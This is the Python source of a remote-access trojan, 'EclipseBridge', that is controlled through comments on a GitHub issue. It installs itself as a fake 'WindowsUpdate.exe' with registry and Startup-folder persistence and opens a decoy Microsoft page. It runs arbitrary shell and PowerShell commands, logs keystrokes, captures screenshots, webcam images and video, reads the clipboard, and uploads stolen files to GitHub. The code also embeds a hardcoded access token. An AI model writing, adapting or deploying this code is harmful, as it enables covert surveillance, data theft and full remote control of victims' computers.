#!/usr/bin/env python3
# =============================================================================
# EclipseBridge Python – GitHub Issues C2 (Final)
#   15‑second poll interval supports up to 15 PCs safely.
# =============================================================================
import cv2
import time
import platform
import pyautogui
import subprocess
import threading
from pynput import keyboard
import os
import re
import json
import socket
import psutil
from datetime import datetime
from uuid import getnode as get_mac
import sys
import base64
import io
import traceback
import webbrowser
import requests
import shutil
import winreg
from pathlib import Path

# -----------------------------------------------------------------------------
# Hardcoded Configuration (your real credentials)
# -----------------------------------------------------------------------------
GITHUB_TOKEN = "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"
REPO_OWNER  = "systemupdater"
REPO_NAME   = "c2-channel"
ISSUE_NUMBER = 1

# Decoy URL (Microsoft documentation)
DECOY_URL = "https://learn.microsoft.com/en-us/dynamics365/supply-chain/procurement/purchase-order-overview"

# -----------------------------------------------------------------------------
# Global log buffer (posted as a comment on startup)
# -----------------------------------------------------------------------------
log_lines = []

def log(msg):
    """Append a timestamped message to the runtime log."""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    line = f"[{timestamp}] {msg}"
    log_lines.append(line)
    print(line)

def send_startup_log(agent_id):
    """Post the current log buffer as a comment and clear it."""
    if not log_lines:
        return
    log_text = "\n".join(log_lines)
    comment = f"**{agent_id} startup log**\n```\n{log_text}\n```"
    try:
        post_comment(comment)
        log_lines.clear()
    except Exception as e:
        print(f"Failed to send startup log: {e}")

# -----------------------------------------------------------------------------
# Persistence (Registry + Startup folder)
# -----------------------------------------------------------------------------
def install_persistence():
    """Copy self to AppData and set Registry Run key + Startup folder."""
    try:
        appdata = os.environ.get('APPDATA')
        dest_dir = Path(appdata) / 'Microsoft' / 'Windows'
        dest_dir.mkdir(parents=True, exist_ok=True)
        dest_path = dest_dir / 'WindowsUpdate.exe'

        current = Path(sys.executable if getattr(sys, 'frozen', False) else __file__)
        if current.resolve() != dest_path.resolve():
            shutil.copy2(current, dest_path)

        # Registry Run key
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r'Software\Microsoft\Windows\CurrentVersion\Run',
                             0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, 'WindowsUpdate', 0, winreg.REG_SZ, str(dest_path))
        winreg.CloseKey(key)

        # Startup folder backup
        startup = Path(appdata) / r'Microsoft\Windows\Start Menu\Programs\Startup'
        shutil.copy2(current, startup / 'WindowsUpdate.exe')
        return True
    except Exception:
        return False

# -----------------------------------------------------------------------------
# GitHub API helpers
# -----------------------------------------------------------------------------
def github_request(method, endpoint, data=None, files=None):
    """Send an authenticated request to the GitHub API."""
    url = f"https://api.github.com{endpoint}"
    headers = {
        "Authorization": f"token {GITHUB_TOKEN}",
        "Accept": "application/vnd.github.v3+json",
        "User-Agent": "EclipseBridge/2.2"
    }
    if method == "GET":
        resp = requests.get(url, headers=headers)
    elif method == "POST":
        if files:
            resp = requests.post(url, headers=headers, files=files)
        else:
            resp = requests.post(url, headers=headers, json=data)
    else:
        raise ValueError("Unsupported method")
    if resp.status_code in (200, 201):
        return resp.json()
    else:
        raise Exception(f"GitHub API error: {resp.status_code} {resp.text[:200]}")

def get_comments():
    """Fetch all comments on the configured issue (paginated)."""
    comments = []
    page = 1
    while True:
        endpoint = f"/repos/{REPO_OWNER}/{REPO_NAME}/issues/{ISSUE_NUMBER}/comments?per_page=100&page={page}"
        batch = github_request("GET", endpoint)
        if not batch:
            break
        comments.extend(batch)
        page += 1
    return comments

def post_comment(body):
    """Create a new comment on the configured issue."""
    endpoint = f"/repos/{REPO_OWNER}/{REPO_NAME}/issues/{ISSUE_NUMBER}/comments"
    github_request("POST", endpoint, {"body": body})

def upload_file_to_issue(filepath):
    """Upload a file as an attachment to a new issue comment."""
    filename = os.path.basename(filepath)
    upload_url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/issues/{ISSUE_NUMBER}/comments"
    with open(filepath, 'rb') as f:
        files = {'file': (filename, f)}
        headers = {"Authorization": f"token {GITHUB_TOKEN}"}
        resp = requests.post(upload_url, headers=headers, files=files)
        if resp.status_code not in (200, 201):
            raise Exception(f"File upload failed: {resp.status_code} {resp.text[:200]}")

# -----------------------------------------------------------------------------
# Agent identification
# -----------------------------------------------------------------------------
appdata = os.environ.get('APPDATA', os.path.expanduser('~'))
agents_dir = os.path.join(appdata, 'Microsoft', 'Windows')
os.makedirs(agents_dir, exist_ok=True)
last_comment_file = os.path.join(agents_dir, 'last_comment_id.txt')

def get_system_id():
    """Return a unique agent identifier (hostname/username)."""
    hostname = execute_system_command("hostname").strip()
    username = execute_system_command("whoami").strip()
    return f"{hostname}/{username}"

def load_last_comment_id():
    """Load the ID of the last processed comment from disk."""
    try:
        with open(last_comment_file) as f:
            return int(f.read().strip())
    except:
        return 0

def save_last_comment_id(cid):
    """Save the ID of the last processed comment to disk."""
    with open(last_comment_file, 'w') as f:
        f.write(str(cid))

# -----------------------------------------------------------------------------
# Keylogger (unchanged from TeleC2 – stores globally and sends to issue)
# -----------------------------------------------------------------------------
keylogger_active = False
keylogger_listener = None
keystroke_buffer = ""
MAX_BUFFER_LENGTH = 100
last_send_time = time.time()
SEND_INTERVAL = 60

def on_press(key):
    global keystroke_buffer, last_send_time
    try:
        if hasattr(key, 'char') and key.char is not None:
            keystroke_buffer += key.char
        elif key == keyboard.Key.space:
            keystroke_buffer += " "
        elif key == keyboard.Key.enter:
            keystroke_buffer += "\n"
        elif key == keyboard.Key.tab:
            keystroke_buffer += "\t"
        else:
            keystroke_buffer += f"[{str(key).replace('Key.', '')}]"
    except AttributeError:
        keystroke_buffer += f"[{str(key)}]"
    current_time = time.time()
    if (len(keystroke_buffer) >= MAX_BUFFER_LENGTH or
            (current_time - last_send_time >= SEND_INTERVAL and keystroke_buffer)):
        send_keystrokes()

def send_keystrokes():
    global keystroke_buffer, last_send_time
    if keystroke_buffer:
        try:
            now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            msg = f"Keylogger data from: {get_system_id()}\nTime: {now}\n\n{keystroke_buffer}"
            post_comment(msg)   # send as a comment
            keystroke_buffer = ""
            last_send_time = time.time()
        except Exception as e:
            print(f"Error sending keystrokes: {e}")

def start_keylogger():
    global keylogger_active, keylogger_listener
    if keylogger_active:
        return "Keylogger is already running"
    try:
        keylogger_listener = keyboard.Listener(on_press=on_press)
        keylogger_listener.start()
        keylogger_active = True
        def periodic_send():
            while keylogger_active:
                time.sleep(SEND_INTERVAL)
                send_keystrokes()
        threading.Thread(target=periodic_send, daemon=True).start()
        log("Keylogger started")
        return "Keylogger started successfully"
    except Exception as e:
        return f"Failed to start keylogger: {str(e)}"

def stop_keylogger():
    global keylogger_active, keylogger_listener, keystroke_buffer
    if not keylogger_active:
        return "Keylogger is not running"
    keylogger_active = False
    if keylogger_listener:
        keylogger_listener.stop()
    if keystroke_buffer:
        send_keystrokes()
    log("Keylogger stopped")
    return "Keylogger stopped successfully"

# -----------------------------------------------------------------------------
# System Command Execution
# -----------------------------------------------------------------------------
def execute_system_command(cmd):
    try:
        output = subprocess.getstatusoutput(cmd)
        return output[1][:4000] if len(output[1]) > 4000 else output[1]
    except Exception as e:
        return f"Error: {e}"

def execute_powershell(cmd):
    try:
        output = subprocess.getstatusoutput(f"powershell -Command {cmd}")
        return output[1][:4000] if len(output[1]) > 4000 else output[1]
    except Exception as e:
        return f"Error: {e}"

def get_clipboard():
    try:
        import win32clipboard
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        return data
    except ImportError:
        return "Clipboard access requires pywin32"
    except Exception as e:
        return f"Clipboard error: {e}"

# -----------------------------------------------------------------------------
# Multimedia Capture (screenshot, webcam, video)
# -----------------------------------------------------------------------------
def take_screenshot():
    try:
        img = pyautogui.screenshot()
        filename = f"{int(time.time())}.png"
        img.save(filename)
        return filename, None
    except Exception as e:
        return None, str(e)

def take_webcam_photo():
    try:
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        if ret:
            filename = f"{int(time.time())}.png"
            cv2.imwrite(filename, frame)
            cap.release()
            return filename, None
        cap.release()
        return None, "Webcam not accessible"
    except Exception as e:
        return None, str(e)

def record_video(duration):
    try:
        cap = cv2.VideoCapture(0)
        fourcc = cv2.VideoWriter_fourcc(*'XVID')
        filename = f"{int(time.time())}.avi"
        out = cv2.VideoWriter(filename, fourcc, 20.0, (640, 480))
        start = time.time()
        while time.time() - start < duration:
            ret, frame = cap.read()
            if not ret:
                break
            out.write(frame)
        out.release()
        cap.release()
        return filename, None
    except Exception as e:
        return None, str(e)

# -----------------------------------------------------------------------------
# Command Dispatcher (returns output string and optional file path to upload)
# -----------------------------------------------------------------------------
def execute_command(full_command):
    parts = full_command.strip().split(' ', 1)
    cmd = parts[0].lower()
    args = parts[1] if len(parts) > 1 else ""

    if cmd == "ping":
        return f"🟢 {get_system_id()} online\n{platform.system()} {platform.release()}", None

    elif cmd == "shell":
        if not args:
            return "Usage: shell <command>", None
        out = execute_system_command(args)
        return out, None

    elif cmd == "powershell":
        if not args:
            return "Usage: powershell <command>", None
        out = execute_powershell(args)
        return out, None

    elif cmd == "screenshot":
        path, err = take_screenshot()
        if err:
            return f"Screenshot failed: {err}", None
        return "Screenshot captured", path

    elif cmd == "webcam":
        path, err = take_webcam_photo()
        if err:
            return f"Webcam failed: {err}", None
        return "Webcam photo", path

    elif cmd == "video":
        try:
            dur = int(args)
        except:
            return "Usage: video <seconds>", None
        path, err = record_video(dur)
        if err:
            return f"Video failed: {err}", None
        return f"Video ({dur}s) recorded", path

    elif cmd == "clipboard":
        return get_clipboard(), None

    elif cmd == "download":
        filepath = args.strip()
        if not os.path.exists(filepath):
            return f"File not found: {filepath}", None
        return f"Uploading {filepath}", filepath

    elif cmd == "delete":
        filepath = args.strip()
        try:
            os.remove(filepath)
            return f"Deleted: {filepath}", None
        except Exception as e:
            return f"Delete failed: {e}", None

    elif cmd == "keylogger":
        subcmd = args.strip().lower()
        if subcmd == "start":
            return start_keylogger(), None
        elif subcmd == "stop":
            return stop_keylogger(), None
        elif subcmd == "status":
            return f"Keylogger is {'active' if keylogger_active else 'inactive'}", None
        else:
            return "Usage: keylogger <start|stop|status>", None

    elif cmd == "die":
        log("Die command received")
        return "Shutting down...", None   # actual exit handled in main loop

    elif cmd == "off":
        try:
            subprocess.run(["shutdown", "/s", "/t", "0", "/f"], check=True)
        except Exception as e:
            return f"Shutdown failed: {e}", None
        return "Shutting down PC...", None

    else:
        return (f"Unknown command: {cmd}\n"
                "Available: ping, shell, powershell, screenshot, webcam, video, "
                "clipboard, download, delete, keylogger (start/stop/status), die, off"), None

# -----------------------------------------------------------------------------
# Main Agent Loop (polls every 15 seconds)
# -----------------------------------------------------------------------------
def agent_loop():
    agent_id = get_system_id()

    # Startup sequence
    log("=== Agent starting ===")
    if install_persistence():
        log("Persistence installed")
    else:
        log("Persistence installation failed")
    send_startup_log(agent_id)

    webbrowser.open(DECOY_URL)

    last_id = load_last_comment_id()

    while True:
        try:
            comments = get_comments()
        except Exception as e:
            log(f"Error fetching comments: {e}")
            time.sleep(15)
            continue

        for comment in comments:
            cid = comment['id']
            if cid <= last_id:
                continue
            last_id = cid
            save_last_comment_id(cid)

            body = comment['body'].strip()
            if not body.startswith('!'):
                continue

            # Parse optional target: @system_id command
            command_part = body[1:].strip()
            target = "*"
            if command_part.startswith('@'):
                space_idx = command_part.find(' ')
                if space_idx != -1:
                    target = command_part[1:space_idx]
                    command_part = command_part[space_idx+1:].strip()
                else:
                    continue   # no command after @target

            if target != "*" and target != agent_id:
                continue   # not for this agent

            log(f"Executing: {command_part}")
            output, file_to_upload = execute_command(command_part)

            # Post response as a new comment
            response = f"**{agent_id}**\n```\n{output}\n```"
            try:
                post_comment(response)
            except Exception as e:
                log(f"Posting response failed: {e}")

            # Upload file if one was generated (screenshot, etc.)
            if file_to_upload and os.path.exists(file_to_upload):
                try:
                    upload_file_to_issue(file_to_upload)
                    log("File uploaded successfully")
                except Exception as e:
                    log(f"File upload failed: {e}")
                finally:
                    try:
                        os.remove(file_to_upload)
                    except:
                        pass

            # Handle die command – exit after processing
            if command_part.startswith("die"):
                os._exit(0)

        time.sleep(15)   # 15‑second poll interval (safe for ≤ 15 agents)

# -----------------------------------------------------------------------------
# Entry Point
# -----------------------------------------------------------------------------
if __name__ == "__main__":
    try:
        agent_loop()
    except Exception as e:
        log(f"Fatal error: {traceback.format_exc()}")
        try:
            send_startup_log(get_system_id())
        except:
            pass
